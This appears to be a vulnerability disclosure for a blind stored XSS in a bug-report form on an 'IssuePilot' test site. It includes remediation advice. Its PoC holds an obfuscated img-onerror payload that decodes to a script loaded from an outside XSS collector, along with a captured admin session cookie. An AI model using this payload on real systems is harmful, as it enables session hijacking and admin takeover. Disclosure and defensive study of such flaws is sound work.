## Title
Blind XSS in Bug Submission Form Fields - IssuePilot

## Description
**Affected URL:** https://issuepilot.pwnedbox.site/submit.php (triggers on https://issuepilot.pwnedbox.site/admin/dashboard.php and the individual report view)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the bug submission form on `issuepilot.pwnedbox.site`. Input submitted in the **Description**, **Steps to reproduce**, **Expected behavior**, and **Actual behavior** fields is stored without HTML encoding and renders directly in the DOM when an administrator opens the admin dashboard or views the report details. Because the script executes inside an authenticated admin session, an attacker can exfiltrate session cookies and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://issuepilot.pwnedbox.site/submit.php`, fill in the required fields, paste the Blind XSS payload into **Description**, **Steps to reproduce**, **Expected behavior**, and **Actual behavior**, and click **Submit bug report**.
2. Log in to the admin panel (`https://issuepilot.pwnedbox.site/admin/dashboard.php`) and open the submitted report (`#2 · GT`).
3. Observe the payload execute immediately on both the admin dashboard preview and the report detail page, sending out-of-band callbacks with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://issuepilot.pwnedbox.site/submit.php` (`Description`, `Steps to reproduce`, `Expected behavior`, and `Actual behavior` fields)

**Trigger Endpoint:** `https://issuepilot.pwnedbox.site/admin/dashboard.php` (and report detail view)

**Payload:**
```html
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>
```

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://issuepilot.pwnedbox.site/admin/dashboard.php`
- **Referrer:** `https://issuepilot.pwnedbox.site/admin/login.php`
- **Exfiltrated Session Cookie:** `PHPSESSID=2ec1899a72b1dcac350ca25aa8dd23d9`

**Visual Evidence:**
- Bug submission form on `issuepilot.pwnedbox.site/submit.php` with the payload entered across the report fields.
  <img width="1436" height="987" alt="Screenshot 2026-11-27 165327" src="https://github.com/user-attachments/assets/c3c5af8d-d5b0-4582-a9b0-59eef227d094" /><br><br>

- Admin dashboard (`/admin/dashboard.php`) rendering the broken image icon in the report list preview (`#2 · GT`) and firing the payload immediately upon login.
  <img width="1268" height="343" alt="Screenshot 2026-11-27 165402" src="https://github.com/user-attachments/assets/b16337af-e173-42c5-8ac9-892c4a556fb1" /><br><br>

- Individual report view displaying rendered broken image icons inside **DESCRIPTION**, **STEPS TO REPRODUCE**, **EXPECTED BEHAVIOR**, and **ACTUAL BEHAVIOR**.
  <img width="1081" height="472" alt="Screenshot 2026-11-27 165412" src="https://github.com/user-attachments/assets/9a309e8c-ffa9-4bc9-9da3-4cf2ab8e6ec5" /><br><br>

- Blind XSS collector reports confirming execution on `/admin/dashboard.php` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1593" height="957" alt="Screenshot 2026-11-27 165354" src="https://github.com/user-attachments/assets/36980ef1-4f8a-4de1-8c1c-f95dec56c84b" /><br>

## Impact
Because the payload fires automatically as soon as an administrator loads the dashboard or triages incoming bug reports:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view, modify, or delete all submitted bug reports and triage notes.
- **Persistent Compromise:** Attackers can use the hijacked admin session to manipulate report statuses or make unauthorized changes across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied bug report fields before rendering them in `/admin/dashboard.php` and the report detail page.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on `/admin/` pages (e.g., `default-src 'self'; script-src 'self';`) to block inline event handlers like `onerror` and restrict external requests.
